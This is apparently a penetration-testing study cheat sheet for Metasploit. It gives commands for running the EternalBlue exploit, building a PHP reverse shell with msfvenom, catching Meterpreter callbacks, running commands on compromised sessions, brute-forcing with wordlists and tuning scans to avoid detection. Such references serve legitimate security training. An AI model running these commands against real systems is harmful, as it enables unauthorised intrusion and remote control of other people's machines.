# Cheatsheet — Metasploit Exploitation
| Command / Action | Example | Purpose |
|---|---|---|
| Start msfconsole | `msfconsole` | Launch Metasploit interactive console |
| Search modules | `search ms17-010` or `search type:auxiliary vnc` | Find exploits/auxiliaries/payloads by keyword, CVE, type, platform |
| Use module | `use exploit/windows/smb/ms17_010_eternalblue` or `use 2` | Enter module context |
| Module info | `info` or `info <module>` | View module metadata, targets, caveats, references |
| Show options | `show options` | List required/optional settings for current module |
| Set parameter | `set RHOSTS 10.10.12.229` | Configure module-scoped option |
| Set global parameter | `setg LHOST 10.10.44.70` | Make option persist across modules |
| Unset / flush | `unset RHOSTS` / `unset all` / `unsetg LHOST` | Remove single/all/global settings |
| Show payloads | `show payloads` | List payloads compatible with current exploit |
| Choose payload | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` | Select payload for exploit |
| Run / exploit | `exploit` or `run` | Launch the module |
| Run and background | `exploit -z` | Launch and immediately background the session |
| Safe check | `check` | Probe target for vulnerability (when supported) |
| List sessions | `sessions` | Show active sessions created by exploits |
| Interact session | `sessions -i <id>` | Attach to a session for interaction |
| Background session | `background` or `CTRL+Z` | Send interactive session to background |
| Kill session(s) | `sessions -k <id>` / `sessions -K` | Terminate session(s) |
| Upgrade shell | `sessions -u <id>` | Attempt to upgrade a shell to Meterpreter |
| Run command on session | `sessions -c 'whoami' -i <id>` | Execute command on a session non-interactively |
| Run OS commands from msfconsole | `exec: <command>` or just `ls` | Execute local OS commands (limited features) |
| Start PostgreSQL (Linux) | `systemctl start postgresql` | Start DB backend for msfdb |
| Initialize DB | `sudo -u postgres msfdb init` | Create Metasploit DB (run non-root/postgres) |
| Check DB status | `db_status` | Verify connection to PostgreSQL backend |
| Workspaces list/add/switch | `workspace` / `workspace -a name` / `workspace name` | Manage project isolation |
| Run Nmap + import | `db_nmap -sV -p- 10.10.12.0/24` | Run Nmap and store results in DB |
| List hosts/services | `hosts` / `services` | Query DB-imported hosts and services |
| Populate module RHOSTS from DB | `hosts -R` (inside module) | Load saved hosts into module RHOSTS |
| Find scanners | `search portscan` / `search type:auxiliary smb` | Discover Metasploit scanning modules |
| Run scanner | `use auxiliary/scanner/portscan/tcp` → `set RHOSTS ...` → `run` | Perform in-console port/service scans |
| UDP quick sweep | `use auxiliary/scanner/discovery/udp_sweep` → `run` | Fast check for common UDP services |
| Generate payload (msfvenom) | `msfvenom -p php/reverse_php LHOST=10.10.44.70 LPORT=7777 -f raw > shell.php` | Create payload in chosen format |
| List msfvenom payloads/formats | `msfvenom -l payloads` / `msfvenom --list formats` | View available payloads / output formats |
| Encode payload (msfvenom) | `-e php/base64` | Encode payload (obfuscation, not guaranteed AV bypass) |
| Make payload executable | `chmod +x rev_shell.elf` | Ensure correct permissions on *nix binaries |
| Start handler | `use exploit/multi/handler` → `set payload ...` → `set LHOST ...` → `run` | Catch reverse shells / Meterpreter callbacks |
| Use DB creds/wordlists in scanners | `set DB_ALL_CREDS true` / `set PASS_FILE /path/to/wordlist` | Leverage DB-stored credentials and wordlists |
| Tune performance/noise | `set THREADS 10` / `set CONCURRENCY 20` / `set DELAY 50` | Balance scan speed vs detectability |
| Save reproducible notes | Record module path, options, payload, workspace, sessions, outputs | For reporting and repeatability |

